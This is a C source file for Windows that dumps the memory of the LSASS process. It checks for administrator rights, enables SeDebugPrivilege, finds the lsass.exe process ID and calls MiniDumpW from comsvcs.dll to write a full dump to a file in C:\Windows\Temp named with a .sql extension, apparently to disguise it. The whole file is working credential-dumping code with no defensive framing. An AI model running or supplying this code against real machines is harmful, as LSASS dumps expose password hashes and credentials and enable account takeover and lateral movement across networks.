#include "minidump.h"


BOOL CheckPrivilege() {
    BOOL state;
    SID_IDENTIFIER_AUTHORITY NtAuthority = SECURITY_NT_AUTHORITY;
    PSID AdministratorsGroup;

    state = AllocateAndInitializeSid(
        &NtAuthority,
        2,
        SECURITY_BUILTIN_DOMAIN_RID,
        DOMAIN_ALIAS_RID_ADMINS,
        SECURITY_LOCAL_SYSTEM_RID, DOMAIN_GROUP_RID_ADMINS, 0, 0, 0, 0,
        &AdministratorsGroup);
    if (state)
    {
        if (!CheckTokenMembership(NULL, AdministratorsGroup, &state))
        {
            state = FALSE;
        }
        FreeSid(AdministratorsGroup);
    }

    return state;
}

BOOL EnableDebugPrivilege()
{

    HANDLE hThis = GetCurrentProcess();
    HANDLE hToken;
    OpenProcessToken(hThis, TOKEN_ADJUST_PRIVILEGES, &hToken);
    LUID luid;
    LookupPrivilegeValue(0, TEXT("seDebugPrivilege"), &luid);
    TOKEN_PRIVILEGES priv;
    priv.PrivilegeCount = 1;
    priv.Privileges[0].Luid = luid;
    priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    BOOL isEnabiled = AdjustTokenPrivileges(hToken, false, &priv, sizeof(priv), 0, 0);
    if (isEnabiled) {
        CloseHandle(hToken);
        CloseHandle(hThis);
        return TRUE;
    }
    return FALSE;
}

DWORD GetLsassPID() {
    DWORD lsassPID = 0;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    PROCESSENTRY32 processEntry = {};
    processEntry.dwSize = sizeof(PROCESSENTRY32);
    LPCWSTR processName = L"";
    //±éÀúlsass.exe µÄPID
    if (Process32First(snapshot, &processEntry)) {
        while (_wcsicmp(processName, L"lsass.exe") != 0) {
            Process32Next(snapshot, &processEntry);
            processName = processEntry.szExeFile;
            lsassPID = processEntry.th32ProcessID;
        }
    }
    return lsassPID;
}

BOOL CheckFileExists(PWCHAR file) {
    WIN32_FIND_DATA FindFileData;
    HANDLE hFind = FindFirstFileEx(file, FindExInfoStandard, &FindFileData, FindExSearchNameMatch, NULL, 0);
    if (hFind == INVALID_HANDLE_VALUE)
    {
        return FALSE;
    }
    return TRUE;
}

BOOL MiniDumpLsass() {
    WCHAR commandLine[MAX_PATH];
    WCHAR DumpFile[] = L"C:\\Windows\\Temp\\111.sql";
    _MiniDumpW MiniDumpW;
    DWORD lsassPID = 0;

    if (!CheckPrivilege()) {
        return FALSE;
    }

    if (!EnableDebugPrivilege()) {
        return FALSE;
    }


    if (CheckFileExists(DumpFile)) {
        return FALSE;
    }

    lsassPID = GetLsassPID();
    MiniDumpW = (_MiniDumpW)GetProcAddress(LoadLibrary(L"comsvcs.dll"), "MiniDumpW");
    _itow_s(lsassPID, commandLine, 10);
    lstrcatW(commandLine, L" ");
    lstrcatW(commandLine, DumpFile);
    lstrcatW(commandLine, L" full");
    MiniDumpW(0, 0, commandLine);
    return TRUE;
}
